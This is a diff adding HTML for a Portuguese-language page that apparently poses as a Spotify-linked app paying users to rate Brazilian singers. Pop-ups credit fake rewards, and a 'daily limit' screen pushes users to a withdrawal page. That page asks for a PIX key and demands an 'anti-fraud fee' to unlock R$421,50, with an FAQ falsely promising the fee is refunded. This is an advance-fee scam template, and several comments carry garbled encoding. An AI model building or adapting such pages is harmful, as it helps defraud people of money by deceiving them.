+  
+            <div class="rating-container" id="rating-container-3">
+              <button class="rating-button" data-rating="1">-18 anos</button>
+              <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+                
+            <button type="button" class="enviarCodigo" id="B8" onclick="showLoadingB8();" style="border: 2px solid #1ed760; border-radius: 50px; padding: 10px 20px; background-color: #1ed760; color: black; cursor: pointer;">
+    
+    <!-- Texto do botão -->
+    Enviar respostas
+    
+    <!-- Ícone de verificação com fundo redondo ao lado direito -->
+    <span style="display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background-color: white; border-radius: 50%; margin-left: 8px;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14" fill="black">
+            <path d="M20.285 6.708a1 1 0 00-1.574-1.194L10.418 15.25l-3.963-4.04a1 1 0 00-1.496 1.327l4.75 4.85a1 1 0 001.496-.025l9.08-10z"></path>
+        </svg>
+    </span>
+</button>
+          
+          </div>
+        </div> 
+          
+          <!---- Popup B8 ---->
+          
+          <div class="popup-recebeu" id="popupB8">
+          
+            <dotlottie-player src="https://lottie.host/47e3a5a0-1dfa-4097-837d-b326f133131d/O8jVEKGnq6.json" background="transparent.html" speed="2" style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay="">
+</dotlottie-player>
+             
+             <span class="popup-text-recebeu" style="font-size: 15px;"><b>Parabéns!</b> Você recebeu:</span>
+             <span class="popup-text-recebeu" style="font-size: 35px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #141414;">R$ 27,00</span>
+           
+          
+          </div>     
+          
+      
+      <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p9" ---------------------->
+      
+        <div class="outer-box" id="ad9" style="display: none">
+          <div class="white-box">
+              
+            <p style="font-size: 15px; text-align: center; margin-top: 0px; margin-bottom: 15px; color: #1ed760;">Avalie o artísta abaixo e <b>ganhe por isso</b></p>
+            
+            <div style="display: flex; justify-content: center;">
+    <iframe style="border-radius:12px" src="https://open.spotify.com/embed/track/6BWWgcNJWXQ4qRuzY5LzBP?utm_source=generator" width="90%" height="152" frameborder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+</div>
+    
+            <p class="pergunta-whats">De bom a ruim, qual nota você daria para as músicas de <b>Felipe Amorim?</b></p>
+  
+            <div class="rating-container">
+              <input type="range" min="1" max="5" value="3" class="slider" id="myRange">
+            </div>
+  
+            <div class="labels">
+              <span class="text-labels">Ruim</span>
+              <span class="text-labels">Normal</span>
+              <span class="text-labels">Bom</span>
+            </div>
+            
+            <p class="pergunta-whats">Recomendaria o cantor <b>Felipe Amorim</b> para seus amigos e familiares?</p>
+  
+            <div class="rating-container" id="rating-container-2">
+              <!-- Botão de polegar negativo -->
+              <button class="rating-button" data-rating="2" aria-label="Não">
+                  <!-- Ícone de polegar negativo -->
+                  <i class="fa-solid fa-thumbs-down"></i>
+              </button>
+              
+              <!-- Botão de polegar positivo -->
+              <button class="rating-button" data-rating="1" aria-label="Sim">
+                  <!-- Ícone de polegar positivo -->
+                  <i class="fa-solid fa-thumbs-up"></i>
+              </button>
+          </div>
+          
+  
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o cantor <b>Felipe Amorim?</b></p>
+  
+            <div class="rating-container" id="rating-container-3">
+              <button class="rating-button" data-rating="1">-18 anos</button>
+              <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+                
+            <button type="button" class="enviarCodigo" id="B9" onclick="showLoadingB9();" style="border: 2px solid #1ed760; border-radius: 50px; padding: 10px 20px; background-color: #1ed760; color: black; cursor: pointer;">
+    
+    <!-- Texto do botão -->
+    Enviar respostas
+    
+    <!-- Ícone de verificação com fundo redondo ao lado direito -->
+    <span style="display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background-color: white; border-radius: 50%; margin-left: 8px;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14" fill="black">
+            <path d="M20.285 6.708a1 1 0 00-1.574-1.194L10.418 15.25l-3.963-4.04a1 1 0 00-1.496 1.327l4.75 4.85a1 1 0 001.496-.025l9.08-10z"></path>
+        </svg>
+    </span>
+</button>
+    
+              
+          </div>
+        </div> 
+          
+          <!---- Popup B9 ---->
+          
+        <div class="popup-recebeu" id="popupB9">
+          
+          <dotlottie-player src="https://lottie.host/47e3a5a0-1dfa-4097-837d-b326f133131d/O8jVEKGnq6.json" background="transparent.html" speed="2" style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay="">
+      </dotlottie-player>
+             
+             <span class="popup-text-recebeu" style="font-size: 15px;"><b>Parabéns!</b> Você recebeu:</span>
+             <span class="popup-text-recebeu" style="font-size: 35px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #141414;">R$ 30,00</span>
+           
+          
+        </div>     
+      
+      <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p10" ---------------------->
+      
+        <div class="outer-box" id="ad10" style="display: none">
+          <div class="white-box">
+              
+            <p style="font-size: 15px; text-align: center; margin-top: 0px; margin-bottom: 15px; color: #1ed760;">Avalie o artísta abaixo e <b>ganhe por isso</b></p>
+            
+            <div style="display: flex; justify-content: center;">
+    <iframe style="border-radius:12px" src="https://open.spotify.com/embed/track/1jHgfC8T5KxUyC5Ldw6lk9?utm_source=generator" width="90%" height="152" frameborder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+</div>
+            
+            <p class="pergunta-whats">De 1 a 5, qual nota você daria para as músicas de <b>Léo Santana?</b></p>
+  
+            <div class="rating-container">
+              <input type="range" min="1" max="5" value="3" class="slider" id="myRange">
+            </div>
+  
+            <div class="labels">
+              <span class="text-labels">Ruim</span>
+              <span class="text-labels">Normal</span>
+              <span class="text-labels">Bom</span>
+            </div>
+            
+            <p class="pergunta-whats">Recomendaria o cantor <b>Léo Santana</b> para seus amigos e familiares?</p>
+  
+            <div class="rating-container" id="rating-container-2">
+              <!-- Botão de polegar negativo -->
+              <button class="rating-button" data-rating="2" aria-label="Não">
+                  <!-- Ícone de polegar negativo -->
+                  <i class="fa-solid fa-thumbs-down"></i>
+              </button>
+              
+              <!-- Botão de polegar positivo -->
+              <button class="rating-button" data-rating="1" aria-label="Sim">
+                  <!-- Ícone de polegar positivo -->
+                  <i class="fa-solid fa-thumbs-up"></i>
+              </button>
+          </div>
+          
+  
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o cantor <b>Léo Santana?</b></p>
+  
+            <div class="rating-container" id="rating-container-3">
+              <button class="rating-button" data-rating="1">-18 anos</button>
+              <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+                
+            <button type="button" class="enviarCodigo" id="B10" onclick="showLoadingB10();" style="border: 2px solid #1ed760; border-radius: 50px; padding: 10px 20px; background-color: #1ed760; color: black; cursor: pointer;">
+    
+    <!-- Texto do botão -->
+    Enviar respostas
+    
+    <!-- Ícone de verificação com fundo redondo ao lado direito -->
+    <span style="display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background-color: white; border-radius: 50%; margin-left: 8px;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14" fill="black">
+            <path d="M20.285 6.708a1 1 0 00-1.574-1.194L10.418 15.25l-3.963-4.04a1 1 0 00-1.496 1.327l4.75 4.85a1 1 0 001.496-.025l9.08-10z"></path>
+        </svg>
+    </span>
+</button>
+    
+              
+          </div>
+        </div> 
+          
+          <!---- Popup B10 ---->
+          
+          <div class="popup-recebeu" id="popupB10">
+          
+            <dotlottie-player src="https://lottie.host/47e3a5a0-1dfa-4097-837d-b326f133131d/O8jVEKGnq6.json" background="transparent.html" speed="2" style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay="">
+</dotlottie-player>
+             
+             <span class="popup-text-recebeu" style="font-size: 15px;"><b>Parabéns!</b> Você recebeu:</span>
+             <span class="popup-text-recebeu" style="font-size: 35px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #141414;">R$ 59,50</span>
+           
+          
+          </div> 
+      
+      
+      <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p11" ---------------------->
+      
+  
+      
+      
+      
+      
+      
+  
+      <!--------------------- Limite atingido --------------------->
+      
+    
+      <div class="popup-containerL" id="popupL">
+  
+        <div id="container-progresso" style="display: flex; margin: 0 auto; width: 300px; height: 300px;">
+          <iframe src="https://lottie.host/embed/165d2c24-8b34-461e-9d0f-5e2140f1c28c/Q9wf5k5QvL.json" style="border: none;"></iframe>>
+        
+            <div id="texto-progresso">
+                <span id="valor-saque"></span>
+                <span style="font-family: 'Montserrat', sans-serif; color: #fff; font-size: 14px;"></span>
+            </div>
+        </div>
+        
+        
+  
+        <p style="font-family: 'Montserrat', sans-serif; font-size: 26px; color: #1ed760; text-align: center; margin-top: 15px; margin-bottom: -5px;">Limite diário atingido!</p>      
+  
+        <p class="font-family: 'Poppins', sans-serif; popup-textL" style="margin-bottom: 20px; font-size: 18px; color: #fff"><b>Precisa sacar seu saldo hoje?</b></p>
+        
+      
+        <button class="desbloquear-button" style="font-weight: bold; font-size: 18x; border-radius: 25px; margin-top: 15px;" href="#" onclick="mostrarPagina('saque')">SAQUE AGORA</button>
+        
+        <p class="popup-textL" style="margin-bottom: 20px; font-size: 12px; color: #dddddd">Ou espere 24h para continuar avaliando.</p>
+        
+  
+  
+       
+      
+  
+  
+  
+        
+        
+      </div>
+  
+  
+      
+      <!--------------------- Menu debaixo --------------------->
+  
+      
+      <div style="margin-bottom: 80px;"></div>
+  
+      
+    </div>
+  
+  
+    
+    <!--------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "Saque" --------------------->
+  
+    
+    <div id="saque" style="display: none;">
+  
+      <div class="menu">
+        <a style="width: 50%; padding: 10px;">
+          <img src="images/opinilogo.png">
+        </a> 
+        <a></a>
+      </div>
+  
+  
+      <div style="margin-bottom: 100px;"></div>
+        
+      
+      <div class="outer-box">
+        <div class="valor-box-saque">
+            <p style="font-size: 16px; margin-bottom: 15px; text-align: center; color: rgb(999, 999, 999);">Seu saldo</p>
+            <span id="valor-money" style="font-size: 30px; text-align: center; font-family: 'Montserrat', sans-serif; letter-spacing: -2px; color: #1ed760;">R$ 67.00</span>
+        </div>
+      </div>
+  
+<div class="elementor-widget-container">
+    <img decoding="async" width="686" height="386" src="images/cont.png" class="attachment-large size-large wp-image-132247" alt="" srcset="images/cont_1.png 686w, images/cont-300x169.png 300w" sizes="(max-width: 686px) 100vw, 686px" style="width: 80%; height: auto; max-width: 686px; display: block; margin: 0 auto; border-radius: 10px;">
+</div>
+
+
+													
+      <p style="margin-bottom: 20x; margin-top: 20px; color: rgb(999, 999, 999); text-align: center; font-weight: bold;">Selecione seu tipo de chave PIX</p>
+  
+      
+      <style>
+    .square-button {
+        background-color: #1d1d1d;
+        border-radius: 6px;
+        border: none;
+        outline: none; /* Remove o contorno padrão do botão */
+        width: 100px; /* Largura do botão */
+        height: 80px;
+        font-size: 20px
+    }
+  
+    .square-button:focus {
+        border: 2px solid #73ff7f; /* Borda branca ao selecionar */
+        border-radius: 20px; /* Bordas arredondadas */
+        background-color: #000000;
+    }
+  </style>
+  
+  <div class="button-container">
+      <button class="square-button" onclick="toggleButton(1)">
+          <img decoding="async" src="images/chavepix1.png" alt="Botao 1">
+      </button>
+  
+      <button class="square-button" onclick="toggleButton(2)">
+          <img decoding="async" src="images/chavepix2.png" alt="Botao 2">
+      </button>
+  
+      <button class="square-button" onclick="toggleButton(3)">
+          <img decoding="async" src="images/chavepix3.png" alt="Botao 3">
+      </button>
+  </div>
+  
+  <div style="margin-bottom: 15px;"></div>
+      
+      
+  
+      
+      <!--------------------- MENU EMBAIXO --------------------->
+  
+      
+      <div class="menuemb">
+        <!-- Botão para mostrar "Saque" -->
+        <a href="#" onclick="mostrarPagina('bonus')" style="text-align: center; display: flex; flex-direction: column; align-items: center; width: 100%;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="rgb(999, 999, 999)" viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12c0 5.52 4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm1-13h-2v2h2V7zm0 3h-2v6h2v-6z"></path>
+            </svg>
+            <span style="font-size: 7px; color: #a3a3a3;">Dúvidas</span>
+        </a>
+    
+        <!-- Novo botão "Início" -->
+        <a href="#" onclick="mostrarPagina('inicio')" style="text-align: center; display: flex; flex-direction: column; align-items: center; width: 100%;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="rgb(999, 999, 999)" viewBox="0 0 24 24">
+                <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"></path>
+            </svg>
+            <span style="font-size: 7px; color: #a3a3a3;">Início</span>
+        </a>
+    </div>
+    
+  
+  
+  <input class="form-input" type="text" name="chave-pix" id="chave-pix" placeholder="Digite sua chave PIX aqui">
+  
+      
+      <button class="desbloquear-button" onclick="showPopup()" style="font-weight: bold; font-size: 18x; border-radius: 50px; margin-bottom: 50px; margin-top: 16px">REALIZAR SAQUE</button>
+      
+      
+    
+    <!--------------------- TAXA DESBLOQUEIO --------------------->
+      
+      <div class="popup-container" id="popup">
+          
+            <dotlottie-player src="https://lottie.host/9e602c0c-e952-4e05-8bd9-4eb71e2560f1/L0um9J3V68.json" background="transparent.html" speed="2" style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay="">
+</dotlottie-player>
+  
+        <!--<span class="popup-text" style="font-size: 20px; font-weight: bold;">APRENDA A DESBLOQUEAR<br>SEU SALDO EM 1 MINUTO</span>--->
+        <span class="popup-text" style="font-size: 20px; font-weight: bold;">Desbloqueie seu saldo!</span>
+  
+        <div style="margin-bottom: 20px;"></div>
+
+        <!-- Caixa verde com bordas arredondadas -->
+     <div style="background-color: #ff7400; border-radius: 10px; padding: 15px; text-align: center; margin-left: 35px; margin-right: 35px; margin-: 35px;">
+      <span style="color: #ffffff; font-size: 16px;"><b>Chave PIX não cadastrada...</b></span>
+    </div>
+
+        <p class="popup-text" style="padding-left: 5%; padding-right: 5%; text-align: center; font-size: 14px">Para receber o seu <b>1º saque no valor de R$421,50</b>, ative sua conta cadastrando a sua Chave PIX.<br><br> Implementamos uma taxa anti-fraudes para prevenir fraudes e abusos nos saques que estavam ocorrendo no sistema. <br><br> Fique tranquilo, <b>você receberá o valor da taxa de volta</b> juntamente com o montante do seu saque. <br><br>
+        
+        </p><div style="margin-bottom: 20px;"></div>
+  
+        <button class="desbloquear-button" style="font-weight: bold; border-radius: 50px;" onclick="">ATIVAR CADASTRO E SACAR</button>
+        <!--<button class="desbloquear-button" style="font-weight: bold;" onclick="video();">VEJA COMO</button>--->
+      </div>
+  
+      <div style="margin-bottom: 20px;"></div>
+  
+      <!--------------------- VIDEO DESBLOQUEIO --------------------->
+  
+      <!--<div class="popup-container" id="popupvideo">
+        
+        <div style="width: 70%; height: 70%; display: flex; margin: 0 auto; border-radius: 12px; margin-bottom: 10px;">
+  
+          <div id="vid_6590e057fa276e0009498386" style="position:relative;width:100%;padding: 178.21782178217822% 0 0; margin-bottom: 10px; border-radius: 12px; display: flex; margin: 0 auto;"><img id="thumb_6590e057fa276e0009498386" src="https://images.converteai.net/0b265e52-7b06-411f-b1b3-e2e5a9c23f78/players/6590e057fa276e0009498386/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;"><div id="backdrop_6590e057fa276e0009498386" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div></div><script type="text/javascript" id="scr_6590e057fa276e0009498386">var s=document.createElement("script");s.src="https://scripts.converteai.net/0b265e52-7b06-411f-b1b3-e2e5a9c23f78/players/6590e057fa276e0009498386/player.js",s.async=!0,document.head.appendChild(s);</script>
+  
+        </div>
+  
+        <button class="desbloquear-button" style="font-weight: bold; border-radius: 50px;" onclick="window.location.href='	
+https://spotify-cadastro.netlify.app'">DESBLOQUEAR AGORA</button>
+  
+      </div>
+  
+      <div style="margin-bottom: 20px;"></div>--->
+  
+      
+    </div>
+    
+    
+  
+   
+      <!--------------------- Pagina bonus --------------------->
+    
+    
+  
+    <div id="bonus" style="display: none;">
+        
+        
+        <!--------------------- Menu de cima --------------------->
+        
+          <div class="menu">
+            <a style="width: 50%; padding: 10px;">
+              <img src="images/opinilogo.png">
+            </a> 
+            <a></a>
+          </div>
+          <div style="margin-bottom: 90px;"></div>
+      
+          <div style="margin-bottom: 110px;"></div>
+       
+          <p class="faq-title">Perguntas frequentes</p>
+  
+          <div class="faq-container">
+            <div class="faq-item">
+              <div class="question" onclick="toggleAnswer(this)">Preciso pagar a taxa toda vez?</div>
+              <div class="answer">Não! A taxa seria paga somente a primeira vez, para confirmar que você é um humano, e não um robô. Você receberá o estorno do valor da taxa após o primeiro saque</div>
+            </div>
+            <div class="faq-item">
+              <div class="question" onclick="toggleAnswer(this)">Por que existe a taxa?</div>
+              <div class="answer">Serve como uma etapa anti-fraude, para evitar fraudes e abusos dos saques que estavam ocorrendo na plataforma! Mas não precisa se preocupar, você receberá o valor da taxa de volta junto ao valor do seu saque; seria apenas uma etapa de validação de que você é humano e não um robô.</div>
+            </div>
+            <div class="faq-item">
+              <div class="question" onclick="toggleAnswer(this)">Em quanto tempo vou receber?</div>
+              <div class="answer">Você receberá seu saque dentro de 24 horas, da mesma forma que você receberá seu saque teste!</div>
+            </div>
+            <div class="faq-item">
+              <div class="question" onclick="toggleAnswer(this)">Quantas vezes posso sacar por dia?</div>
+              <div class="answer">Quantos você quiser, mas existe uma quantidade limitada de códigos que temos acesso por dia!</div>
+            </div>
+            <div class="faq-item">
+              <div class="question" onclick="toggleAnswer(this)">Como usa o aplicativo?</div>
+              <div class="answer">É muito simples de usar! Basta responder as perguntas sobre os artistas no menu principal e, por fim, clicar no botão de 'Enviar respostas'. Quando enviar, você já receberá seu dinheiro pela tarefa realizada!</div>
+            </div>
+        </div>
+  
+        <div style="margin-bottom: 150px;"></div>
+  
+  
+  
+    
+      
+      
+      <!--------------------- Menu debaixo --------------------->
+  
+      
+      
+  
+  
+      
+      <div class="menuemb">
+        <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "InÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â­cio" -->
+        <a href="#" onclick="mostrarPagina('saque')" style="text-align: center; display: flex; flex-direction: column; align-items: center; width: 100%;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="rgb(999, 999, 999)" viewBox="0 0 24 24" style="font-size: 40px;">
+              <path d="M19 6H5C3.9 6 3 6.9 3 8v8c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm0 10H5V8h14v8zM6 10h8v2H6z"></path>
+          </svg>
+          <span style="font-size: 7px; color: #a3a3a3">Saldo</span>
+          </a>
+          <!-- Novo botão "Início" -->
+        <a href="#" onclick="mostrarPagina('inicio')" style="text-align: center; display: flex; flex-direction: column; align-items: center; width: 100%;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="rgb(999, 999, 999)" viewBox="0 0 24 24">
+              <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"></path>
+          </svg>
+          <span style="font-size: 7px; color: #a3a3a3;">Início</span>
+      </a>
+      </div>
+      
+      
+    </div>
+    
+    <!--------------------- Fim do body --------------------->
+    
+    <script src="js/scripts.js"></script>
+  
+  
+  </body></html>
